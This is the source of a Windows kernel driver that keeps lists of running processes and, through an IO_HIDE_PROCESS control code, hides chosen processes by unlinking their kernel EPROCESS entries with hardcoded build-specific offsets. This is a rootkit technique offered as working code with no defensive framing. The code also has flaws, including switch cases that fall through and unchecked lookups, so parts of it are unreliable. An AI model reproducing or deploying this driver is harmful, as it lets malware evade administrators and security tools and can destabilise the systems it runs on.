#include <ntifs.h>
#include "vector.h"
#include "common.h"
#include "data.h"
#include "autolock.h"


// Globals
//------------------------------------------
FastMutex mutex;
vector<ProcessInfo*> processes;
vector<const char*> names;
vector<ProcessInfo*> allProcesses;
//------------------------------------------


extern "C"
NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING)
{
	mutex.Init();
	WString dos{ "\\??\\random" };

	auto status = STATUS_SUCCESS;
	PDEVICE_OBJECT DeviceObject = nullptr;
	bool symLink = false;

	FindProcess(nullptr, allProcesses);

	do
	{
		//UNICODE_STRING dev = RTL_CONSTANT_STRING(L"\\Device\\random");

		WString dev{ "\\Device\\random" };
		status = IoCreateDevice(pDriverObject, 0, dev.Unicode(), FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);
		if (!NT_SUCCESS(status))
		{
			DbgMsg("failed in IoCreateDevice\n");
			break;
		}
		DeviceObject->Flags |= DO_DIRECT_IO;
		DeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;

		status = IoCreateSymbolicLink(dos.Unicode(), dev.Unicode());
		if (!NT_SUCCESS(status))
		{
			DbgMsg("failed in IoCreateSymbolicLink\n");
			break;
		}
		symLink = true;

		status = PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, FALSE);
		if (!NT_SUCCESS(status))
		{
			DbgMsg("failed in PsSetCreateProcessNotifyRoutineEx\n");
			break;
		}

	} while (false);

	if (!NT_SUCCESS(status))
	{
		if (symLink)
			IoDeleteSymbolicLink(dos.Unicode());
		if (DeviceObject)
			IoDeleteDevice(DeviceObject);
		return status;
	}

	pDriverObject->DriverUnload = UnloadDriver;
	pDriverObject->MajorFunction[IRP_MJ_CREATE] =
		pDriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateClose;
	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IoControl;

	DbgMsg("Driver loaded\n");
	return STATUS_SUCCESS;
}



void UnloadDriver(PDRIVER_OBJECT pDriverObject)
{
	WString dos{ "\\??\\random" };
	PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, TRUE);
	IoDeleteSymbolicLink(dos.Unicode());
	IoDeleteDevice(pDriverObject->DeviceObject);

	{
		AutoLock lock(mutex);
		processes.free();
		allProcesses.free();
		names.free();
	}

	DbgMsg("Driver unloaded\n");
}

NTSTATUS IrpComplete(PIRP Irp, NTSTATUS Status, ULONG_PTR Info)
{
	Irp->IoStatus.Status = Status;
	Irp->IoStatus.Information = Info;
	IoCompleteRequest(Irp, 0);
	return Status;
}

NTSTATUS CreateClose(PDEVICE_OBJECT, PIRP Irp)
{
	return IrpComplete(Irp);
}

NTSTATUS IoControl(PDEVICE_OBJECT, PIRP Irp)
{
	auto stack = IoGetCurrentIrpStackLocation(Irp);
	auto controlCode = stack->Parameters.DeviceIoControl.IoControlCode;
	auto status = STATUS_UNSUCCESSFUL;
	ULONG byteIO = 0;

	auto found = [](auto str, auto substr)
	{
		for (int i = 0; i < str.size(); ++i)
		{
			if (strstr(str.at(i), substr))
				return i;
		}
		return -1;
	};

	switch (controlCode)
	{
	case IO_ADD_PROCESS:
	{
		__try
		{
			auto name = (const char*)Irp->AssociatedIrp.SystemBuffer;
			if (found(names, name) < 0)
			{
				auto ptr = (char*)ExAllocatePool2(POOL_FLAG_PAGED, strlen(name) + 1, DRIVER_TAG);
				if (ptr)
				{
					AutoLock lock(mutex);
					RtlCopyMemory(ptr, name, strlen(name) + 1);
					names.push_back(ptr);
				}

				DbgMsg("Name list:\n");
				for (int i = 0; i < names.size(); ++i)
				{
					if (names.at(i) != 0)
						DbgMsg("%s\n", names.at(i));
				}
				status = STATUS_SUCCESS;
				byteIO = stack->Parameters.DeviceIoControl.InputBufferLength;
				break;
			}

			break;
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			status = exception_code();
			DbgMsg("(IO_ADD_PROCESS) -> Status = (%x)\n", status);
		}
	}

	case IO_REMOVE_PROCESS:
	{
		__try
		{
			auto name = (const char*)Irp->AssociatedIrp.SystemBuffer;
			auto index = found(names, name);
			if (index >= 0)
			{
				AutoLock lock(mutex);
				DbgMsg("process %s removed\n", names.at(index));
				ExFreePool((PVOID)names.at(index));
				names.at(index) = nullptr;
				if (index == names.size() - 1)
					names.pop_back();
				else
				{
					names.at(index) = names.at(names.size() - 1);
					names.pop_back();
				}

				DbgMsg("Name list:\n");
				for (int i = 0; i < names.size(); ++i)
				{
					if (names.at(i))
						DbgMsg("%s\n", names.at(i));
				}
				status = STATUS_SUCCESS;
				byteIO = stack->Parameters.DeviceIoControl.InputBufferLength;
				break;
			}

			break;
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			status = exception_code();
			DbgMsg("(IO_REMOVE_PROCESS) -> Status = (%x)\n", status);
		}
	}

	case IO_UPDATE_PROCESS_LIST:
	{
		__try
		{
			{
				AutoLock lock(mutex);
				while (processes.size() > 0)
				{
					if (processes.at(processes.size() - 1))
						ExFreePool(processes.at(processes.size() - 1));
					processes.pop_back();
				}
			}

			for (int i = 0; i < names.size(); ++i)
			{
				if (names.at(i))
					FindProcess(names.at(i), processes);
			}

			auto buffer = (ProcessInfo*)Irp->AssociatedIrp.SystemBuffer;
			auto len = stack->Parameters.DeviceIoControl.InputBufferLength;
			auto _size = len / sizeof(ProcessInfo);

			if (_size > processes.size())
				_size = processes.size();

			auto index = 0;
			{
				AutoLock lock(mutex);
				for (int i = 0; i < _size; ++i)
				{
					memcpy(buffer[i].Name, processes.at(i)->Name, SIZEOF(buffer->Name));
					buffer[i].PidCount = processes.at(i)->PidCount;
					for (int j = 0; j < SIZEOF(buffer->Pid); ++j)
					{
						if (processes.at(i)->Pid[j] != 0)
							buffer[i].Pid[index++] = processes.at(i)->Pid[j];
					}
					byteIO += sizeof(buffer[i]);
					index = 0;
				}
			}

			status = STATUS_SUCCESS;
			break;
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			status = exception_code();
			DbgMsg("(IO_UPDATE_PROCESS_LIST) -> Status = (%x)\n", status);
		}
	}

	case IO_ACTIVE_PROCESSES:
	{
		__try
		{
			auto buffer = (ProcessInfo*)Irp->AssociatedIrp.SystemBuffer;
			auto len = stack->Parameters.DeviceIoControl.InputBufferLength;
			auto _size = len / sizeof(ProcessInfo);

			if (_size > allProcesses.size())
				_size = allProcesses.size();

			auto index = 0;
			{
				AutoLock lock(mutex);
				for (int i = 0; i < _size; ++i)
				{
					memcpy(buffer[i].Name, allProcesses.at(i)->Name, SIZEOF(buffer->Name));
					buffer[i].PidCount = allProcesses.at(i)->PidCount;
					for (int j = 0; j < SIZEOF(buffer->Pid); ++j)
					{
						if (allProcesses.at(i)->Pid[j] != 0)
							buffer[i].Pid[index++] = allProcesses.at(i)->Pid[j];
					}
					byteIO += sizeof(buffer[i]);
					index = 0;
				}
			}

			status = STATUS_SUCCESS;
			break;
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			status = exception_code();
			DbgMsg("(IO_ACTIVE_PROCESSES) -> Status = (%x)\n", status);
		}
	}

	case IO_HIDE_PROCESS:
	{
		__try
		{
			auto name = (char*)Irp->AssociatedIrp.SystemBuffer;
			if (!name)
				status = STATUS_INSUFFICIENT_RESOURCES;
			else
			{
				for (int i = 0; i < allProcesses.size(); ++i)
				{
					if (strstr(allProcesses.at(i)->Name, name))
					{
						for (int j = 0; j < SIZEOF(allProcesses.at(i)->Pid); ++j)
						{
							if (allProcesses.at(i)->Pid[j] != 0)
							{
								HideByPid(allProcesses.at(i)->Pid[j]);
								DbgMsg("%s (%u) hidden\n", allProcesses.at(i)->Name, allProcesses.at(i)->Pid[j]);
							}
						}
						{
							AutoLock lock(mutex);
							ExFreePool(allProcesses.at(i));
							allProcesses.at(i) = nullptr;
							allProcesses.at(i) = allProcesses.at(allProcesses.size() - 1);
							allProcesses.pop_back();
						}
					}
				}
				status = STATUS_SUCCESS;
				byteIO = sizeof(name);
			}
			break;
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			status = exception_code();
			DbgMsg("(IO_HIDE_PROCESS) -> Status = (%x)\n", status);
		}
	}

	default:
		byteIO = 0;
	}

	return IrpComplete(Irp, status, byteIO);
}

void FindProcess(const char* name, vector<ProcessInfo*>& vec)
{
	auto sysProcess = PsInitialSystemProcess;
	auto curProcess = sysProcess;
	bool access = true;

	do
	{
		const CHAR* const curName = (CHAR*)((uintptr_t)curProcess + 0x5a8);
		if (name)
		{
			if (strstr(curName, name))
				access = true;
			else
				access = false;
		}

		if (access)
		{
			auto activeThreads = *((ULONG*)((uintptr_t)curProcess + 0x5f0));
			if (activeThreads)
			{
				auto pid = *((ULONG*)((uintptr_t)curProcess + 0x440));
				auto proc = RetProcByName(curName, vec);
				if (proc)
				{
					AutoLock lock(mutex);
					if (!FindPid(pid, proc) && proc->PidCount < SIZEOF(proc->Pid))
					{
						for (int i = 0; i < SIZEOF(proc->Pid); ++i)
						{
							if (proc->Pid[i] == 0)
							{
								proc->Pid[i] = pid;
								++proc->PidCount;
								break;
							}
						}
					}
				}
				else
				{
					auto ptr = (ProcessInfo*)ExAllocatePool2(POOL_FLAG_PAGED, sizeof(ProcessInfo), DRIVER_TAG);
					if (!ptr)
					{
						DbgMsg("(FindProcessByName) -> failed allocation\n");
						return;
					}
					else
					{
						AutoLock lock(mutex);
						RtlZeroMemory(ptr, sizeof(ProcessInfo));
						RtlCopyMemory(ptr->Name, curName, SIZEOF(ptr->Name));
						*ptr->Pid = pid;
						++ptr->PidCount;
						vec.push_back(ptr);
					}
				}
			}
		}

		PLIST_ENTRY list = (PLIST_ENTRY)((uintptr_t)curProcess + 0x448);
		curProcess = (PEPROCESS)((uintptr_t)list->Flink - 0x448);

	} while (curProcess != sysProcess);
}

ProcessInfo* RetProcByName(const char* name, vector<ProcessInfo*>& vec, int& index)
{
	AutoLock lock(mutex);
	for (int i = 0; i < vec.size(); ++i)
	{
		if (strstr((char*)vec.at(i)->Name, name))
		{
			index = i;
			return vec.at(i);
		}
	}
	return nullptr;
}

bool FindPid(ULONG pid, ProcessInfo* process)
{
	for (int i = 0; i < SIZEOF(process->Pid); ++i)
	{
		if (process->Pid[i] == pid)
			return true;
	}
	return false;
}

bool RemovePid(ULONG pid, ProcessInfo* proc)

{
	if (proc && proc->PidCount > 0)
	{
		for (int i = 0; i < SIZEOF(proc->Pid); ++i)
		{
			if (proc->Pid[i] == pid)
			{
				proc->Pid[i] = 0;
				--proc->PidCount;
				return true;
			}
		}
	}
	return false;
}

void OnProcessNotify(PEPROCESS, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo)
{
	/*UNREFERENCED_PARAMETER(ProcessId);
	UNREFERENCED_PARAMETER(CreateInfo);*/
	__try
	{
		if (CreateInfo)
		{
			PEPROCESS process;
			PsLookupProcessByProcessId(ProcessId, &process);
			const CHAR* const name = (CHAR*)((uintptr_t)process + 0x5a8);
			auto pid = HandleToULong(ProcessId);
			auto proc = RetProcByName(name, allProcesses);
			if (proc != nullptr)
			{
				AutoLock lock(mutex);
				if (!FindPid(pid, proc) && proc->PidCount < SIZEOF(proc->Pid))
				{
					for (int i = 0; i < SIZEOF(proc->Pid); ++i)
					{
						if (proc->Pid[i] == 0)
						{
							proc->Pid[i] = pid;
							++proc->PidCount;
							DbgMsg("PID: (%u) added [%s]\n", pid, name);
							break;
						}
					}
				}
			}
			else
			{
				auto ptr = (ProcessInfo*)ExAllocatePool2(POOL_FLAG_PAGED, sizeof(ProcessInfo), DRIVER_TAG);
				if (!ptr)
				{
					DbgMsg("(OnProcessNotify) -> failed allocation\n");
					return;
				}
				else
				{
					AutoLock lock(mutex);
					RtlZeroMemory(ptr, sizeof(ProcessInfo));
					RtlCopyMemory(ptr->Name, name, SIZEOF(ptr->Name));
					*ptr->Pid = pid;
					++ptr->PidCount;
					allProcesses.push_back(ptr);
					DbgMsg("First -> PID: (%u) added [%s]\n", pid, ptr->Name);
				}
			}
			ObDereferenceObject(process);
		}
		else
		{
			const CHAR* const name = (CHAR*)((uintptr_t)PsGetCurrentProcess() + 0x5a8);
			auto pid = *((ULONG*)((uintptr_t)PsGetCurrentProcess() + 0x440));
			int index{};
			auto proc = RetProcByName(name, allProcesses, index);
			if (proc != nullptr)
			{
				AutoLock lock(mutex);
				if (proc->PidCount > 1)
				{
					if (RemovePid(pid, proc))
						DbgMsg("PID: (%u) removed [%s]\n", pid, name);
				}
				else
				{
					DbgMsg("Last -> PID: (%u) removed [%s]\n", pid, allProcesses.at(index)->Name);
					ExFreePool(allProcesses.at(index));
					allProcesses.at(index) = nullptr;
					allProcesses.at(index) = allProcesses.at(allProcesses.size() - 1);
					allProcesses.pop_back();
				}
			}
			else
				DbgMsg("(HIDDEN)PID: (%u) removed [%s]\n", pid, name);
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		auto status = exception_code();
		DbgMsg("(OnProcessNotify)Status = (%x)\n", status);
	}
}

void HideByPid(ULONG pid)
{
	PEPROCESS process;
	PsLookupProcessByProcessId(ULongToHandle(pid), &process);
	PLIST_ENTRY list = (PLIST_ENTRY)((uintptr_t)process + 0x448);
	list->Blink->Flink = list->Flink;
	list->Flink->Blink = list->Blink;
	list->Flink = (PLIST_ENTRY)&list->Flink;
	list->Blink = (PLIST_ENTRY)&list->Flink;
	ObDereferenceObject(process);
}
